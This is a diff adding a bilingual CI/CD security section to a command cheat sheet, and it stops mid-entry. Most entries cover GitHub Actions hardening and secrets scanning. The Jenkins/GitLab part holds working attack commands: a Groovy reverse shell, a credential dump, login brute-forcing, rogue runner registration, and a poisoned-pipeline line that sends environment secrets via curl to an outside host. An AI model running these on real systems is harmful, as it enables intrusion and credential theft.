@@ -38344,5 +38344,1997 @@ module.exports = [
         ]
       }
     ]
+  },
+  {
+    "id": "cicd-security",
+    "name": "CI/CD Pipeline Security",
+    "name_tr": "CI/CD Pipeline Güvenliği",
+    "icon": "🔁",
+    "description": "Securing CI/CD pipelines: GitHub Actions / GitLab CI hardening, secrets scanning, SAST/DAST integration, OIDC, and runner security.",
+    "description_tr": "CI/CD pipelinelarını güvenli hale getirme: GitHub Actions / GitLab CI sıkılaştırma, gizli bilgi tarama, SAST/DAST entegrasyonu, OIDC ve runner güvenliği.",
+    "subcategories": [
+      {
+        "name": "GitHub Actions Hardening (permissions, pinning, OIDC, harden-runner)",
+        "commands": [
+          {
+            "title": "Set Minimal Default GITHUB_TOKEN Permissions",
+            "desc": "Drop all token scopes at workflow top level (least privilege)",
+            "desc_tr": "Tüm token izinlerini iş akışı üst seviyesinde sıfırla (en az ayrıcalık)",
+            "cmd": "permissions: {}",
+            "tags": [
+              "essential"
+            ],
+            "note": "Set read-all or {} at the top, then grant per-job only what is needed."
+          },
+          {
+            "title": "Read-Only Repo Contents Permission",
+            "desc": "Grant only contents:read to the workflow token",
+            "desc_tr": "İş akışı token'ına yalnızca contents:read izni ver",
+            "cmd": "permissions:\n  contents: read",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Job-Level OIDC Permission",
+            "desc": "Grant id-token:write at job level for OIDC federation",
+            "desc_tr": "OIDC federasyonu için iş seviyesinde id-token:write izni ver",
+            "cmd": "permissions:\n  id-token: write\n  contents: read",
+            "tags": [
+              "essential"
+            ],
+            "note": "id-token:write is required to mint an OIDC token for cloud login; keep it scoped to the single job that needs it."
+          },
+          {
+            "title": "Pin Action to Full-Length Commit SHA",
+            "desc": "Reference an action by immutable 40-char commit SHA, not a tag",
+            "desc_tr": "Bir action'ı değişebilir tag yerine değişmez 40 karakterlik commit SHA ile referansla",
+            "cmd": "uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1",
+            "tags": [
+              "essential"
+            ],
+            "note": "Tags and branches are mutable; only a full SHA is immutable against supply-chain tampering."
+          },
+          {
+            "title": "Resolve a Tag to Its Commit SHA",
+            "desc": "Look up the immutable SHA behind an action tag for pinning",
+            "desc_tr": "Pinleme için bir action tag'inin arkasındaki değişmez SHA'yı bul",
+            "cmd": "git ls-remote https://github.com/actions/checkout refs/tags/v4.1.1",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Pin All Actions Automatically with Pinact",
+            "desc": "Rewrite every uses: tag to a pinned SHA across workflows",
+            "desc_tr": "Tüm iş akışlarındaki uses: tag'lerini pinlenmiş SHA'ya otomatik dönüştür",
+            "cmd": "pinact run .github/workflows/*.yml",
+            "tags": [
+              "tool"
+            ],
+            "note": "pinact (suzuki-shunsuke/pinact) also appends the human-readable tag as a comment after the SHA."
+          },
+          {
+            "title": "Verify Pins Are Up to Date (CI Check)",
+            "desc": "Fail if any action is unpinned or pin comment is stale",
+            "desc_tr": "Herhangi bir action pinlenmemiş veya pin yorumu eskimişse hata ver",
+            "cmd": "pinact run --check .github/workflows/*.yml",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Pin Actions with Ratchet",
+            "desc": "Pin third-party actions and container images to digests",
+            "desc_tr": "Üçüncü taraf action'ları ve container imajlarını digest'lere pinle",
+            "cmd": "ratchet pin .github/workflows/<FILE>.yml",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Audit Actions with Ratchet (No Write)",
+            "desc": "Check that all references in a workflow are pinned",
+            "desc_tr": "Bir iş akışındaki tüm referansların pinlenmiş olduğunu denetle",
+            "cmd": "ratchet check .github/workflows/<FILE>.yml",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Harden-Runner Egress Audit Mode",
+            "desc": "Monitor and log all outbound network calls from the runner",
+            "desc_tr": "Runner'dan giden tüm ağ çağrılarını izle ve logla",
+            "cmd": "uses: step-security/harden-runner@v2\n  with:\n    egress-policy: audit",
+            "tags": [
+              "tool",
+              "essential"
+            ],
+            "note": "Run in audit first to learn the legitimate egress endpoints before switching to block."
+          },
+          {
+            "title": "Harden-Runner Egress Block Mode",
+            "desc": "Allow only listed endpoints; block all other egress",
+            "desc_tr": "Yalnızca listelenen uç noktalara izin ver; diğer tüm giden trafiği engelle",
+            "cmd": "uses: step-security/harden-runner@v2\n  with:\n    egress-policy: block\n    allowed-endpoints: >\n      github.com:443\n      <REGISTRY>:443",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Harden-Runner Block Sudo / Disable File Monitoring",
+            "desc": "Restrict privilege escalation and tune runtime monitors",
+            "desc_tr": "Ayrıcalık yükseltmeyi kısıtla ve çalışma zamanı izleyicilerini ayarla",
+            "cmd": "uses: step-security/harden-runner@v2\n  with:\n    egress-policy: block\n    disable-sudo: true",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "OIDC Login to AWS (Keyless)",
+            "desc": "Assume an AWS role via OIDC with no long-lived keys",
+            "desc_tr": "OIDC ile uzun ömürlü anahtar olmadan bir AWS rolü üstlen",
+            "cmd": "uses: aws-actions/configure-aws-credentials@v4\n  with:\n    role-to-assume: arn:aws:iam::<ACCOUNT_ID>:role/<ROLE>\n    aws-region: <REGION>",
+            "tags": [
+              "tool",
+              "essential"
+            ],
+            "note": "Restrict the IAM trust policy's sub claim to repo:<ORG>/<REPO>:ref:refs/heads/main to stop other repos assuming the role."
+          },
+          {
+            "title": "OIDC Login to Azure (Keyless)",
+            "desc": "Authenticate to Azure via federated OIDC credentials",
+            "desc_tr": "Federe OIDC kimlik bilgileriyle Azure'a kimlik doğrula",
+            "cmd": "uses: azure/login@v2\n  with:\n    client-id: <CLIENT_ID>\n    tenant-id: <TENANT_ID>\n    subscription-id: <SUBSCRIPTION_ID>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "OIDC Login to GCP (Workload Identity Federation)",
+            "desc": "Exchange the GitHub OIDC token for short-lived GCP creds",
+            "desc_tr": "GitHub OIDC token'ını kısa ömürlü GCP kimlik bilgileriyle değiştir",
+            "cmd": "uses: google-github-actions/auth@v2\n  with:\n    workload_identity_provider: <WIF_PROVIDER>\n    service_account: <SA_EMAIL>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Inspect the Raw OIDC Token Claims",
+            "desc": "Request and decode the GitHub OIDC JWT to inspect subject claims",
+            "desc_tr": "Subject claim'lerini incelemek için GitHub OIDC JWT'sini iste ve çöz",
+            "cmd": "curl -sH \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=<AUDIENCE>\" | jq -r '.value' | cut -d. -f2 | base64 -d | jq",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Use the sub, repository and ref claims to write tight cloud trust conditions."
+          },
+          {
+            "title": "Scan Workflows with Zizmor",
+            "desc": "Static-analyze GitHub Actions for security misconfigurations",
+            "desc_tr": "GitHub Actions'ı güvenlik yanlış yapılandırmaları için statik analiz et",
+            "cmd": "zizmor .github/workflows/",
+            "tags": [
+              "tool",
+              "essential"
+            ],
+            "note": "zizmor flags unpinned actions, template injection, excessive permissions and dangerous triggers."
+          },
+          {
+            "title": "Zizmor Online Audit (Pull Org Context)",
+            "desc": "Run zizmor with GitHub API access for deeper org-aware checks",
+            "desc_tr": "Daha derin org-farkında kontroller için GitHub API erişimiyle zizmor çalıştır",
+            "cmd": "GH_TOKEN=$(gh auth token) zizmor --gh-token \"$GH_TOKEN\" <ORG>/<REPO>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Lint Workflows with Actionlint",
+            "desc": "Catch syntax errors and injectable run-step expressions",
+            "desc_tr": "Sözdizimi hatalarını ve enjekte edilebilir run adımı ifadelerini yakala",
+            "cmd": "actionlint -color .github/workflows/<FILE>.yml",
+            "tags": [
+              "tool"
+            ],
+            "note": "actionlint's shellcheck integration flags ${{ github.event.* }} used unquoted in run: blocks (template injection)."
+          },
+          {
+            "title": "Audit Org Action Permissions via API",
+            "desc": "Show which actions are allowed to run across the organization",
+            "desc_tr": "Organizasyon genelinde hangi action'ların çalışmasına izin verildiğini göster",
+            "cmd": "gh api /orgs/<ORG>/actions/permissions/selected-actions",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Restrict Org to Verified + SHA-Pinned Actions",
+            "desc": "Allow only GitHub-owned and verified-creator actions org-wide",
+            "desc_tr": "Org genelinde yalnızca GitHub'a ait ve doğrulanmış oluşturucu action'larına izin ver",
+            "cmd": "gh api -X PUT /orgs/<ORG>/actions/permissions/selected-actions -F github_owned_allowed=true -F verified_allowed=true -f 'patterns_allowed[]=<ORG>/*'",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Disable GITHUB_TOKEN Write at Org Default",
+            "desc": "Force default token permissions to read-only organization-wide",
+            "desc_tr": "Varsayılan token izinlerini org genelinde salt-okunur olmaya zorla",
+            "cmd": "gh api -X PUT /orgs/<ORG>/actions/permissions/workflow -F default_workflow_permissions=read",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Block Actions From Approving Pull Requests",
+            "desc": "Prevent GITHUB_TOKEN from approving or creating PRs",
+            "desc_tr": "GITHUB_TOKEN'ın PR onaylamasını veya oluşturmasını engelle",
+            "cmd": "gh api -X PUT /orgs/<ORG>/actions/permissions/workflow -F can_approve_pull_request_reviews=false",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Find Unpinned Actions Across All Workflows",
+            "desc": "Grep for uses: references that lack a 40-char SHA pin",
+            "desc_tr": "40 karakterlik SHA pini olmayan uses: referanslarını bul",
+            "cmd": "grep -rEn 'uses:\\s+[^#]+@(v?[0-9]|main|master)' .github/workflows/",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Safe Handling of Untrusted Input (Env Var)",
+            "desc": "Pass event data via env to avoid template injection in run steps",
+            "desc_tr": "run adımlarında template enjeksiyonunu önlemek için event verisini env ile aktar",
+            "cmd": "env:\n  TITLE: ${{ github.event.issue.title }}\nrun: echo \"$TITLE\"",
+            "tags": [
+              "essential"
+            ],
+            "note": "Never interpolate ${{ github.event.* }} directly inside a run: script; bind it to an env var and quote it."
+          },
+          {
+            "title": "Prefer pull_request Over pull_request_target",
+            "desc": "Avoid running privileged workflows against fork-controlled code",
+            "desc_tr": "Fork kontrolündeki koda karşı ayrıcalıklı iş akışları çalıştırmaktan kaçın",
+            "cmd": "on:\n  pull_request:\n    branches: [ main ]",
+            "tags": [
+              "essential"
+            ],
+            "note": "pull_request_target runs with repo secrets and the base ref's token; never checkout+build untrusted PR head under it."
+          },
+          {
+            "title": "Pin GitHub-Hosted Runner to a Specific Image",
+            "desc": "Avoid 'latest'/'ubuntu-latest' drift by pinning the runner image",
+            "desc_tr": "Runner imajını pinleyerek 'latest'/'ubuntu-latest' kaymasını önle",
+            "cmd": "runs-on: ubuntu-24.04",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Concurrency Guard Against Race/Replay",
+            "desc": "Cancel in-flight runs of the same ref to reduce race exposure",
+            "desc_tr": "Yarış durumu açığını azaltmak için aynı ref'in devam eden çalışmalarını iptal et",
+            "cmd": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true",
+            "tags": [
+              "advanced"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "GitLab CI / Jenkins Security",
+        "commands": [
+          {
+            "title": "Jenkins Version Fingerprint",
+            "desc": "Identify Jenkins version from the X-Jenkins HTTP header",
+            "desc_tr": "X-Jenkins HTTP başlığından Jenkins sürümünü tespit et",
+            "cmd": "curl -sI http://<TARGET_IP>:8080/ | grep -i 'X-Jenkins'",
+            "tags": [
+              "essential"
+            ],
+            "note": "The X-Jenkins-Session and X-Hudson headers also confirm a Jenkins instance even behind a reverse proxy."
+          },
+          {
+            "title": "Jenkins Anonymous Access Check",
+            "desc": "Test for unauthenticated access to the Jenkins API",
+            "desc_tr": "Jenkins API'sine kimlik doğrulamasız erişimi test et",
+            "cmd": "curl -s http://<TARGET_IP>:8080/api/json?pretty=true",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Jenkins Script Console RCE",
+            "desc": "Run a Groovy command via the script console REST endpoint",
+            "desc_tr": "Script console REST uç noktası üzerinden Groovy komutu çalıştır",
+            "cmd": "curl -s -u <USER>:<TOKEN> --data-urlencode 'script=println \"id\".execute().text' http://<TARGET_IP>:8080/scriptText",
+            "tags": [
+              "essential"
+            ],
+            "note": "Requires Overall/RunScripts permission. /scriptText returns raw output without the HTML wrapper."
+          },
+          {
+            "title": "Jenkins Groovy Reverse Shell",
+            "desc": "Spawn a reverse shell from the Jenkins script console",
+            "desc_tr": "Jenkins script console'dan ters bağlantı kabuğu başlat",
+            "cmd": "String host=\"<TARGET_IP>\";int port=4444;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Paste into Manage Jenkins > Script Console. Start a listener with 'nc -lvnp 4444' first."
+          },
+          {
+            "title": "Jenkins Credential Dump via Groovy",
+            "desc": "Decrypt and print all stored username/password credentials",
+            "desc_tr": "Saklanan tüm kullanıcı adı/parola kimlik bilgilerini çöz ve yazdır",
+            "cmd": "com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null).each{ println it.id + ' | ' + it.username + ':' + it.password }",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Run in the Script Console; passwords are returned in cleartext via the Secret toString."
+          },
+          {
+            "title": "Jenkins Decrypt Stored Secret",
+            "desc": "Decrypt a Jenkins {AQAAAB...} encrypted secret string",
+            "desc_tr": "Jenkins {AQAAAB...} şifreli secret değerini çöz",
+            "cmd": "println(hudson.util.Secret.decrypt(\"<ENCRYPTED_SECRET>\"))",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Jenkins Offline Credential Decryption",
+            "desc": "Decrypt credentials.xml offline using master.key and hudson.util.Secret",
+            "desc_tr": "credentials.xml'i master.key ve hudson.util.Secret ile çevrimdışı çöz",
+            "cmd": "python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Needs $JENKINS_HOME/secrets/master.key, secrets/hudson.util.Secret and credentials.xml exfiltrated from the host."
+          },
+          {
+            "title": "Jenkins CLI Authentication",
+            "desc": "Authenticate to the Jenkins CLI to enumerate jobs and nodes",
+            "desc_tr": "İş ve düğümleri listelemek için Jenkins CLI'ye kimlik doğrula",
+            "cmd": "java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080/ -auth <USER>:<TOKEN> who-am-i",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Get Jenkins API Crumb (CSRF Token)",
+            "desc": "Fetch the CSRF crumb required for authenticated POST requests",
+            "desc_tr": "Kimlik doğrulamalı POST istekleri için gereken CSRF crumb'ını al",
+            "cmd": "curl -s -u <USER>:<TOKEN> 'http://<TARGET_IP>:8080/crumbIssuer/api/json'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Generate Jenkins API Token",
+            "desc": "Create a personal API token via the token generation endpoint",
+            "desc_tr": "Token üretim uç noktası ile kişisel API token'ı oluştur",
+            "cmd": "curl -s -u <USER>:<PASS> -H \"$CRUMB\" -X POST 'http://<TARGET_IP>:8080/me/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken?newTokenName=pt'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Brute-Force Jenkins Login",
+            "desc": "Spray credentials against the Jenkins form login endpoint",
+            "desc_tr": "Jenkins form login uç noktasına kimlik bilgisi denemesi yap",
+            "cmd": "hydra -L users.txt -P passwords.txt <TARGET_IP> http-post-form '/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -s 8080",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Enumerate Jenkins with jenkins-attack-framework",
+            "desc": "Test access level and dump secrets with JAF",
+            "desc_tr": "JAF ile erişim seviyesini test et ve secret'ları dök",
+            "cmd": "python3 jaf.py -s http://<TARGET_IP>:8080 -a <USER>:<TOKEN> ListAccessLevel",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Pwn Jenkins via Pipeline Groovy",
+            "desc": "Create and trigger a malicious pipeline job to gain RCE",
+            "desc_tr": "RCE elde etmek için kötü amaçlı pipeline işi oluştur ve tetikle",
+            "cmds": [
+              "JENKINS_URL='http://<TARGET_IP>:8080'",
+              "curl -s -u <USER>:<TOKEN> -X POST \"$JENKINS_URL/createItem?name=pt-job\" -H 'Content-Type: application/xml' --data-binary @pipeline-job.xml",
+              "curl -s -u <USER>:<TOKEN> -X POST \"$JENKINS_URL/job/pt-job/build\""
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "A pipeline with 'sh \"id\"' runs on whichever agent the job is assigned to, often the controller if no agents exist."
+          },
+          {
+            "title": "Read Jenkins Build Logs via API",
+            "desc": "Pull console output of the last build to harvest leaked secrets",
+            "desc_tr": "Sızan secret'ları toplamak için son build'in konsol çıktısını çek",
+            "cmd": "curl -s -u <USER>:<TOKEN> 'http://<TARGET_IP>:8080/job/<JOB>/lastBuild/consoleText'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Scan Jenkinsfile with Checkov",
+            "desc": "Statically analyze CI pipeline definitions for misconfigurations",
+            "desc_tr": "CI pipeline tanımlarını yanlış yapılandırmalar için statik analiz et",
+            "cmd": "checkov -d <PATH> --framework github_actions,gitlab_ci",
+            "tags": [
+              "tool"
+            ],
+            "note": "Checkov ships built-in policies for GitLab CI and GitHub Actions but not native Jenkinsfile; use semgrep for Groovy."
+          },
+          {
+            "title": "GitLab Version & Instance Enumeration",
+            "desc": "Read GitLab version and metadata from the public API",
+            "desc_tr": "GitLab sürüm ve meta verisini herkese açık API'den oku",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<DOMAIN>/api/v4/version'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List GitLab CI/CD Variables (Secrets)",
+            "desc": "Dump project-level CI/CD variables including masked secrets",
+            "desc_tr": "Maskelenmiş secret'lar dahil proje CI/CD değişkenlerini dök",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<DOMAIN>/api/v4/projects/<PROJECT_ID>/variables'",
+            "tags": [
+              "essential"
+            ],
+            "note": "Masked variables are still returned in plaintext via the API if the token has Maintainer/Owner rights."
+          },
+          {
+            "title": "List GitLab Group-Level Variables",
+            "desc": "Enumerate inherited CI/CD secrets defined at the group scope",
+            "desc_tr": "Grup kapsamında tanımlı miras CI/CD secret'larını listele",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<DOMAIN>/api/v4/groups/<GROUP_ID>/variables'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Steal GitLab Runner Registration Token",
+            "desc": "Read the runner token from a compromised runner's config",
+            "desc_tr": "Ele geçirilmiş runner'ın config'inden runner token'ını oku",
+            "cmds": [
+              "cat /etc/gitlab-runner/config.toml",
+              "# Extract the 'token =' value from each [[runners]] block"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "With a runner token you can register a rogue runner and capture jobs/secrets from the target project."
+          },
+          {
+            "title": "Register a Rogue GitLab Runner",
+            "desc": "Register an attacker-controlled runner to intercept pipeline jobs",
+            "desc_tr": "Pipeline işlerini ele geçirmek için saldırgan kontrollü runner kaydet",
+            "cmd": "gitlab-runner register --non-interactive --url 'https://<DOMAIN>/' --registration-token '<RUNNER_TOKEN>' --executor shell --tag-list 'docker,build'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Match the tags used by legitimate jobs so the malicious runner is selected for sensitive pipelines."
+          },
+          {
+            "title": "Poison GitLab CI Pipeline (PPE)",
+            "desc": "Inject a malicious job into .gitlab-ci.yml to exfiltrate secrets",
+            "desc_tr": "Secret'ları sızdırmak için .gitlab-ci.yml'e kötü amaçlı iş enjekte et",
+            "cmd": "printf 'pwn:\\n  stage: build\\n  script:\\n    - env | curl -s -X POST --data-binary @- https://<DOMAIN>/collect\\n' >> .gitlab-ci.yml",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Direct PPE relies on push access; poisoned-pipeline-execution via a merge request runs in the target's context."
+          },
+          {
+            "title": "Read GitLab CI Job Trace (Logs)",
+            "desc": "Fetch a CI job's full log to mine for leaked credentials",
+            "desc_tr": "Sızan kimlik bilgilerini aramak için CI işinin tam logunu çek",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<DOMAIN>/api/v4/projects/<PROJECT_ID>/jobs/<JOB_ID>/trace'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Download GitLab Job Artifacts",
+            "desc": "Pull build artifacts that may contain secrets or binaries",
+            "desc_tr": "Secret veya ikili içerebilen build artifact'larını indir",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' -o artifacts.zip 'https://<DOMAIN>/api/v4/projects/<PROJECT_ID>/jobs/<JOB_ID>/artifacts'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Lint a .gitlab-ci.yml Remotely",
+            "desc": "Validate and expand a pipeline config via the GitLab CI Lint API",
+            "desc_tr": "GitLab CI Lint API ile pipeline config'ini doğrula ve genişlet",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<DOMAIN>/api/v4/projects/<PROJECT_ID>/ci/lint' --data-urlencode \"content=$(cat .gitlab-ci.yml)\"",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Scan CI Configs for Secrets with Gitleaks",
+            "desc": "Detect hardcoded credentials in pipeline files and repo history",
+            "desc_tr": "Pipeline dosyaları ve repo geçmişinde gömülü kimlik bilgilerini tara",
+            "cmd": "gitleaks detect --source <PATH> --report-format json --report-path gitleaks.json",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Audit CI/CD Stack with Chain-Bench",
+            "desc": "Benchmark a SCM/CI org against the CIS Software Supply Chain controls",
+            "desc_tr": "SCM/CI organizasyonunu CIS yazılım tedarik zinciri kontrollerine göre denetle",
+            "cmd": "chain-bench scan --repository-url https://<DOMAIN>/<NAMESPACE>/<FILE> --access-token <GITLAB_TOKEN>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit Pipelines with Cycode Raven",
+            "desc": "Map and detect vulnerable workflow patterns across CI pipelines",
+            "desc_tr": "CI pipeline'larında zafiyetli iş akışı desenlerini haritala ve tespit et",
+            "cmd": "raven download account --token <GITLAB_TOKEN> --account-name <NAMESPACE> && raven report --format json",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Find Self-Hosted Runners with Gato-X",
+            "desc": "Enumerate runners and PPE attack paths in CI/CD repos",
+            "desc_tr": "CI/CD depolarında runner'ları ve PPE saldırı yollarını listele",
+            "cmd": "gato-x enumerate -t <NAMESPACE>/<FILE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Gato-X targets GitHub Actions primarily; for GitLab use the project's REST runner endpoints to list self-hosted runners."
+          }
+        ]
+      },
+      {
+        "name": "Secrets Scanning (gitleaks, trufflehog, detect-secrets)",
+        "commands": [
+          {
+            "title": "Gitleaks: scan git history",
+            "desc": "Scan full git commit history for leaked secrets",
+            "desc_tr": "Sizan secretler icin tum git commit gecmisini tara",
+            "cmd": "gitleaks git <PATH> --verbose",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Older versions used 'gitleaks detect'; v8.19+ prefers the 'git' subcommand."
+          },
+          {
+            "title": "Gitleaks: scan working directory (no git)",
+            "desc": "Scan files on disk without relying on git metadata",
+            "desc_tr": "Git verisine bagli olmadan diskteki dosyalari tara",
+            "cmd": "gitleaks dir <PATH> --verbose",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Gitleaks: pre-commit (staged changes only)",
+            "desc": "Block secrets before they are committed",
+            "desc_tr": "Secretleri commit edilmeden once engelle",
+            "cmd": "gitleaks git --staged --no-banner --redact",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Ideal inside a Husky/pre-commit hook to stop leaks at the source."
+          },
+          {
+            "title": "Gitleaks: JSON report for CI",
+            "desc": "Export findings as JSON and fail the pipeline on hits",
+            "desc_tr": "Bulgulari JSON olarak disa aktar ve hit varsa pipeline'i basarisiz yap",
+            "cmd": "gitleaks git <PATH> --report-format json --report-path gitleaks-report.json --exit-code 1",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Gitleaks: SARIF output for GitHub code scanning",
+            "desc": "Produce SARIF for the GitHub Security tab",
+            "desc_tr": "GitHub Security sekmesi icin SARIF ciktisi uret",
+            "cmd": "gitleaks dir <PATH> --report-format sarif --report-path gitleaks.sarif",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Gitleaks: custom config + baseline",
+            "desc": "Use a custom ruleset and ignore known baseline findings",
+            "desc_tr": "Ozel kural seti kullan ve bilinen baseline bulgularini yoksay",
+            "cmd": "gitleaks git <PATH> --config .gitleaks.toml --baseline-path gitleaks-baseline.json",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Generate the baseline once with a normal JSON report, then feed it back to suppress accepted findings."
+          },
+          {
+            "title": "Gitleaks: scan a specific commit range",
+            "desc": "Limit history scan to a range of commits",
+            "desc_tr": "Gecmis taramasini belirli bir commit araligiyla sinirla",
+            "cmd": "gitleaks git <PATH> --log-opts=\"<FROM_COMMIT>..<TO_COMMIT>\"",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "log-opts passes flags straight to 'git log', e.g. --since or HEAD~20..HEAD for PR-only scans."
+          },
+          {
+            "title": "Gitleaks: scan via Docker",
+            "desc": "Run gitleaks without a local install using the official image",
+            "desc_tr": "Resmi imaj ile yerel kurulum olmadan gitleaks calistir",
+            "cmd": "docker run --rm -v <PATH>:/repo zricethezav/gitleaks:latest git /repo --verbose",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "TruffleHog: scan a git repo (verified only)",
+            "desc": "Scan a repository and show only live, verified credentials",
+            "desc_tr": "Bir depoyu tara ve yalnizca canli, dogrulanmis kimlik bilgilerini goster",
+            "cmd": "trufflehog git file://<PATH> --only-verified",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Verification actively calls the provider API to confirm the secret is still valid."
+          },
+          {
+            "title": "TruffleHog: scan a remote GitHub repo",
+            "desc": "Scan a remote repository URL directly",
+            "desc_tr": "Uzak bir depo URL'sini dogrudan tara",
+            "cmd": "trufflehog github --repo=https://github.com/<ORG>/<REPO>.git --only-verified",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "TruffleHog: scan an entire GitHub org",
+            "desc": "Enumerate and scan all repos in an organization",
+            "desc_tr": "Bir organizasyondaki tum depolari listele ve tara",
+            "cmd": "trufflehog github --org=<ORG> --token=<GITHUB_TOKEN> --only-verified",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "TruffleHog: scan a filesystem path",
+            "desc": "Scan local files and directories for secrets",
+            "desc_tr": "Yerel dosya ve dizinleri secretler icin tara",
+            "cmd": "trufflehog filesystem <PATH> --only-verified",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "TruffleHog: scan a Docker image",
+            "desc": "Inspect image layers for embedded secrets",
+            "desc_tr": "Gomulu secretler icin imaj katmanlarini incele",
+            "cmd": "trufflehog docker --image=<IMAGE> --only-verified",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "TruffleHog: scan an S3 bucket",
+            "desc": "Scan objects in an S3 bucket for credentials",
+            "desc_tr": "Bir S3 bucket'indaki nesneleri kimlik bilgileri icin tara",
+            "cmd": "trufflehog s3 --bucket=<BUCKET> --only-verified",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "TruffleHog: CI mode with JSON + fail",
+            "desc": "Emit JSON and return non-zero when results are found",
+            "desc_tr": "JSON uret ve sonuc bulununca sifir-disi don",
+            "cmd": "trufflehog git file://<PATH> --only-verified --json --fail",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "--fail makes the process exit non-zero on verified findings, perfect for breaking a pipeline."
+          },
+          {
+            "title": "TruffleHog: scan only since a commit (PR diff)",
+            "desc": "Scan just the commits introduced in a branch/PR",
+            "desc_tr": "Yalnizca bir dal/PR'da eklenen commitleri tara",
